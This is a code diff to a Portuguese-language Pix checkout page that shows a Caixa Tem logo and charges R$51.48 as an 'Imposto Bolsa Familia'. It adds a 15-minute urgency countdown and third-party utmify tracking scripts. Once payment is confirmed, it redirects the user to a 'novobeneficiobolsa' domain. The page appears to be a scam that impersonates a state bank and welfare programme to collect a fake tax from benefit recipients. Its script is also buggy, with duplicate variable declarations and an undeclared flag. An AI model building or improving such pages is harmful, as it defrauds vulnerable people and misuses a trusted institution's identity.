@@ -20,7 +20,7 @@
     .produto-info {
       display: flex;
       gap: 15px;
-      margin-bottom: 20px;
+      margin-bottom: 30px;
     }
     .produto-info img {
       width: 90px;
@@ -175,6 +175,56 @@
       .produto-dados { text-align: left; }
     }
   </style>
+<style>
+  .logo-fixa {
+    width: 100px;
+    height: auto;
+  }
+  .logo-fixa img {
+    width: 100%;
+    height: auto;
+  }
+</style>
+
+<script>
+  let tempo = 15 * 60; // 15 minutos em segundos
+
+  const atualizarContador = () => {
+    const minutos = String(Math.floor(tempo / 60)).padStart(2, '0');
+    const segundos = String(tempo % 60).padStart(2, '0');
+    document.getElementById("tempoRestante").innerText = `${minutos}:${segundos}`;
+    tempo--;
+
+    if (tempo < 0) {
+      clearInterval(contador);
+    }
+  };
+
+  // Inicializa o contador assim que a página carregar
+  let contador;
+  window.addEventListener("DOMContentLoaded", () => {
+    atualizarContador(); // Primeira atualização imediata
+    contador = setInterval(atualizarContador, 1000);
+  });
+</script>
+
+<script>
+  window.pixelId = "682037a59d79b84f10f846db";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
 </head>
 <body>
 
@@ -229,7 +279,7 @@
   margin-top: 14px;
   line-height: 1.2;
 ">
-  Para efetuar o pagamento, leia o código QR ou copie o código abaixo e selecione a opção "copia e cola" no aplicativo do seu banco.
+  Para efetuar o pagamento, leia o código QR ou copie o código abaixo e selecione a opção <b>"copia e cola" no aplicativo do seu banco.</b>
 </p>
   <div class="pix-code" id="pixCode">Carregando código Pix...</div>
   <button class="btn-copy" onclick="copiarPix()">
@@ -280,59 +330,245 @@
   };
 
   let verificador;
-  let pixJaGerado = false;
-  async function gerarPix() {
-    if (pixJaGerado) return;
-    pixJaGerado = true;
-    const nome = decodeURIComponent(getParam('nome') || 'Cliente Teste');
-    const cpf = getParam('cpf') || '00000000000';
+async function gerarPix() {
+  if (pixGerado) return; // evita execução duplicada
+  pixGerado = true;
 
-    document.getElementById('nomeCliente').innerText = nome;
-    document.getElementById('cpfCliente').innerText = cpf;
+  const nome = decodeURIComponent(getParam('nome') || 'Cliente Teste');
+  const cpf = getParam('cpf') || '00000000000';
 
-    const body = {
-      identifier: "81xy74ektq",
-      amount: 51.48,
-      client: {
-        name: nome,
-        email: "default@email.com",
-        phone: "(11) 99999-9999",
-        document: cpf
-      },
-      products: [
-        {
-          id: "cmabolds900uzw7u9odlkozbn",
-          name: "Imposto Bolsa Familia",
-          quantity: 1,
-          price: 51.48
-        }
-      ],
-      dueDate: new Date(Date.now() + 10 * 60 * 1000).toISOString().split('.')[0] + 'Z',
-      metadata: {
-        origem: "automatica"
-      },
-      callbackUrl: "https://minha.api.com/pix/callback/ho5a2y9cdm"
-    };
+  document.getElementById('nomeCliente').innerText = nome;
+  document.getElementById('cpfCliente').innerText = cpf;
 
-    const res = await fetch('/pix-duckfy', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
-    });
-
-    const data = await res.json();
-    if (data.pix) {
-      let src = data.pix.base64;
-      if (!src.startsWith("data:image")) {
-        src = `data:image/png;base64,${src}`;
+  const body = {
+    identifier: "81xy74ektq",
+    amount: 51.48,
+    client: {
+      name: nome,
+      email: "default@email.com",
+      phone: "(11) 99999-9999",
+      document: cpf
+    },
+    products: [
+      {
+        id: "cmabolds900uzw7u9odlkozbn",
+        name: "Imposto Bolsa Familia",
+        quantity: 1,
+        price: 51.48
       }
-      document.getElementById('qrCode').innerHTML = `<img src="${src}" alt="QR Code Pix" />`;
-      document.getElementById('pixCode').innerText = data.pix.code || "Código não disponível";
-      verificador = setInterval(() => checarStatus(data.transactionId || ""), 10000);
-    }
-  }
+    ],
+    dueDate: new Date(Date.now() + 10 * 60 * 1000).toISOString().split('.')[0] + 'Z',
+    metadata: {
+      origem: "automatica"
+    },
+    callbackUrl: "https://minha.api.com/pix/callback/ho5a2y9cdm"
+  };
 
-  window.addEventListener('DOMContentLoaded', gerarPix);
+  const res = await fetch('/pix-duckfy', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body)
+  });
+
+  const data = await res.json();
+  if (data.pix) {
+    let src = data.pix.base64;
+    if (!src.startsWith("data:image")) {
+      src = `data:image/png;base64,${src}`;
+    }
+    document.getElementById('qrCode').innerHTML = `<img src="${src}" alt="QR Code Pix" />`;
+    document.getElementById('pixCode').innerText = data.pix.code || "Código não disponível";
+    verificador = setInterval(() => checarStatus(data.transactionId || ""), 10000);
+  }
+}
+
+  
+
+    // Verifica status do pagamento a cada 5 segundos
+    let verificador = setInterval(async () => {
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const id = urlParams.get("id");
+        if (!id) return;
+
+        const res = await fetch(`/pix-status?id=${id}`);
+        const data = await res.json();
+
+        if (data.status === "PAID") {
+          clearInterval(verificador);
+          
+        const baseUrl = "https://novobeneficiobolsa.com.br/inicio/bolsa-up2/";
+        const currentParams = new URLSearchParams(window.location.search);
+        const redirectParams = new URLSearchParams();
+
+        ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'xcod', 'nome'].forEach(param => {
+          if (currentParams.has(param)) {
+            redirectParams.set(param, currentParams.get(param));
+          }
+        });
+
+        const finalUrl = baseUrl + "?" + redirectParams.toString();
+        
+        const aguardandoEl = document.querySelector(".aguardando");
+        if (aguardandoEl) {
+          aguardandoEl.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" height="18" fill="#4CAF50" viewBox="0 0 24 24" width="18" style="margin-right:6px;"><path d="M0 0h24v24H0z" fill="none"/><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Pagamento confirmado!';
+        }
+        setTimeout(() => {
+          window.location.href = finalUrl;
+        }, 2000);
+
+    
+        }
+      } catch (e) {
+        console.error("Erro ao verificar status do pagamento:", e);
+      }
+    }, 5000);
+
+    // Preenche nome e CPF automaticamente se presentes na URL
+    const nomeParam = new URLSearchParams(window.location.search).get("nome");
+    const cpfParam = new URLSearchParams(window.location.search).get("cpf");
+
+    if (nomeParam) {
+      const nomeEl = document.getElementById("nomeCliente");
+      if (nomeEl) nomeEl.innerText = decodeURIComponent(nomeParam);
+    }
+
+    if (cpfParam) {
+      const cpfEl = document.getElementById("cpfCliente");
+      if (cpfEl) cpfEl.innerText = cpfParam;
+    }
+</script>
+
+
+<style>
+  .loading-overlay {
+    position: fixed;
+    inset: 0;
+    background: linear-gradient(to bottom, #0052cc, #2d87ff);
+    color: white;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+  }
+  .loading-circle {
+    width: 120px;
+    height: 120px;
+    border: 8px solid rgba(255,255,255,0.3);
+    border-top: 8px solid white;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 30px;
+    position: relative;
+  }
+  .loading-circle img {
+    position: absolute;
+    top: 25%;
+    left: 25%;
+    width: 50%;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  .loading-text {
+    text-align: center;
+    font-family: Arial, sans-serif;
+  }
+  .loading-text h2 {
+    margin: 0;
+    font-size: 20px;
+    font-weight: bold;
+  }
+  .loading-text p {
+    margin: 8px 0 0;
+    font-size: 15px;
+  }
+</style>
+<style>
+  .logo-fixa {
+    width: 170px;
+    height: auto;
+  }
+  .logo-fixa img {
+    width: 100%;
+    height: auto;
+  }
+</style>
+
+<div class="loading-overlay" id="loadingScreen">
+  <div class="logo-fixa" style="margin-bottom: 20px;">
+    <img src="logocaixa-webp.webp" alt="Caixa Tem Logo">
+  </div>
+  <div class="loading-circle"></div>
+  <div class="loading-text">
+    <h2>Preparando seu pagamento</h2>
+    <p>Estamos gerando seu QR Code Pix...</p>
+  </div>
+</div>
+<script>
+  window.addEventListener('DOMContentLoaded', function () {
+    setTimeout(function () {
+      const overlay = document.getElementById('loadingScreen');
+      if (overlay) overlay.remove();
+      gerarPix(); // Gera o pix após 2 segundos
+    }, 4000);
+  });
+
+    // Verifica status do pagamento a cada 5 segundos
+    let verificador = setInterval(async () => {
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const id = urlParams.get("id");
+        if (!id) return;
+
+        const res = await fetch(`/pix-status?id=${id}`);
+        const data = await res.json();
+
+        if (data.status === "PAID") {
+          clearInterval(verificador);
+          
+        const baseUrl = "https://novobeneficiobolsa.com.br/inicio/bolsa-up1/";
+        const currentParams = new URLSearchParams(window.location.search);
+        const redirectParams = new URLSearchParams();
+
+        ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'xcod', 'nome'].forEach(param => {
+          if (currentParams.has(param)) {
+            redirectParams.set(param, currentParams.get(param));
+          }
+        });
+
+        const finalUrl = baseUrl + "?" + redirectParams.toString();
+        
+        const aguardandoEl = document.querySelector(".aguardando");
+        if (aguardandoEl) {
+          aguardandoEl.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" height="18" fill="#4CAF50" viewBox="0 0 24 24" width="18" style="margin-right:6px;"><path d="M0 0h24v24H0z" fill="none"/><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Pagamento confirmado!';
+        }
+        setTimeout(() => {
+          window.location.href = finalUrl;
+        }, 2000);
+
+    
+        }
+      } catch (e) {
+        console.error("Erro ao verificar status do pagamento:", e);
+      }
+    }, 5000);
+
+    // Preenche nome e CPF automaticamente se presentes na URL
+    const nomeParam = new URLSearchParams(window.location.search).get("nome");
+    const cpfParam = new URLSearchParams(window.location.search).get("cpf");
+
+    if (nomeParam) {
+      const nomeEl = document.getElementById("nomeCliente");
+      if (nomeEl) nomeEl.innerText = decodeURIComponent(nomeParam);
+    }
+
+    if (cpfParam) {
+      const cpfEl = document.getElementById("cpfCliente");
+      if (cpfEl) cpfEl.innerText = cpfParam;
+    }
 </script>
 
 </body>
